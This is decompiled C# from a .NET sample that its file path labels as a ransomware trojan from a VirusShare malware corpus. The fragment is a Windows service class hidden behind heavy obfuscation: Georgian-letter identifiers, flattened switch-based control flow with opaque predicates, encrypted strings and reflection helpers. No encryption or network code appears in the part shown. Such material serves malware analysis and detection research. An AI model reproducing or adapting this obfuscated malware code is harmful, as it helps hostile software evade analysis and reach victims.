// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႥႠ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႥႠ : ServiceBase
  {
    private IContainer Ⴀ;

    public ႥႠ() => this.Ⴐ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    [SpecialName]
    internal static ႳႣ.ႣႷ Ⴗ()
    {
      Type type1 = typeof (ႳႣ.ႣႷ);
      Type type2 = typeof (Convert);
      string name = ႷႨ.Ⴅ(ႳႥ.Ⴍ(2076022954, (ႳႥ) null, 3, (Assembly) null));
      Array array = (Array) new Type[1];
      ((Type[]) array)[0] = typeof (int);
      Type[] types = array as Type[];
      // ISSUE: explicit non-virtual call
      MethodInfo method = __nonvirtual (type2.GetMethod(name, types));
      return (ႳႣ.ႣႷ) ႭႰ.Ⴈ<MethodInfo, Type>(type1, method, 'Ŷ', (short) 323);
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            goto label_5;
          case 1:
          case 4:
          case 6:
            goto label_4;
          case 3:
            num = this.Ⴀ == null ? (int) ⴗ[55] - 44669 : 1;
            continue;
          default:
            num = !obj0 ? 2 : (int) ⴍ[49];
            continue;
        }
      }
label_4:
      this.Ⴀ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴐ()
    {
      this.Ⴀ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႳႥ.Ⴍ(2076023001, (ႳႥ) null, 7, (Assembly) null), (short) 179, 'Û');
    }

    static ႥႠ() => ႳႣ.Ⴅ();

    internal static int Ⴃ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] int obj2, [In] int obj3) where \u0021\u00210 : Random
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      byte[] ⴍ = ႣႣ.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = 4;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num3 = obj0.Next(obj1);
            num2 = 11;
            continue;
          case 2:
          case 9:
          case 10:
            num2 = 4;
            continue;
          case 3:
            num3 = obj2;
            num2 = (int) ⴐ[446] - 129;
            continue;
          case 4:
            int num4;
            switch ((obj2 ^ obj3) - 125 ^ num1)
            {
              case 0:
                num4 = 0;
                break;
              default:
                num4 = 3;
                break;
            }
            num2 = num4;
            continue;
          case 5:
            num2 = 2976 > 992 - 517 * 3 ? 6 : (int) ⴐ[401] - 110;
            continue;
          case 6:
            goto label_13;
          case 7:
            goto label_3;
          case 8:
            num2 = (int) ⴍ[11];
            continue;
          case 11:
            ++num1;
            goto case 5;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႥႠ.Ⴃ);
            num2 = (int) ⴐ[456] - (int) ⴐ[121];
            continue;
        }
      }
label_13:
      return num3;
    }

    internal static Assembly Ⴄ([In] char obj0, [In] int obj1)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴍ[19];
      ISerializable serializable;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            int num4 = 122;
            num2 = 274 < num3 / 2 - num4 ? 8 : 4;
            continue;
          case 1:
            goto label_3;
          case 2:
            num2 = 8;
            continue;
          case 4:
            goto label_12;
          case 5:
          case 10:
            ++num1;
            num3 = 548;
            goto case 0;
          case 7:
            serializable = (ISerializable) Assembly.GetExecutingAssembly();
            num2 = 5;
            continue;
          case 8:
            int num5;
            switch (((int) obj0 ^ obj1) - 1 ^ num1)
            {
              case 0:
                num5 = 7;
                break;
              default:
                num5 = 9;
                break;
            }
            num2 = num5;
            continue;
          case 9:
            serializable = (ISerializable) null;
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႥႠ.Ⴄ);
            num2 = 1;
            continue;
        }
      }
label_12:
      return serializable as Assembly;
    }

    internal static void Ⴓ<\u0021\u00210>(
      [In] \u0021\u00210 obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3,
      [In] short obj4,
      [In] int obj5)
      where \u0021\u00210 : Stream
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      byte[] ⴐ = ႷႨ.Ⴐ;
      char[] ⴗ = ႷႼ.Ⴗ;
      int num1 = 8;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++num2;
            int num4 = (int) obj4;
            int num5 = num4 * num4;
            num3 = (int) obj4 + num5;
            int num6 = (int) ⴐ[87];
            ႷႼ.Ⴗ[77] = (char) ((int) ႷႼ.Ⴗ[77] & obj5 & 15);
            num1 = num6 - 32;
            continue;
          case 1:
          case 7:
            num1 = 0;
            continue;
          case 2:
            int num7;
            switch (((int) obj4 ^ obj5) - 92 ^ num2)
            {
              case 0:
                num7 = 6;
                break;
              default:
                num7 = (int) ⴍ[45];
                break;
            }
            num1 = num7;
            continue;
          case 3:
            num1 = num3 % 2 != 0 ? (int) ⴍ[25] : (int) ⴗ[94] - 57014;
            continue;
          case 4:
          case 6:
            obj0.Write(obj1, obj2, obj3);
            goto case 0;
          case 5:
            goto label_11;
          case 9:
            goto label_12;
          default:
            num2 = 0;
            num1 = 2;
            continue;
        }
      }
label_11:
      return;
label_12:;
    }
  }
}
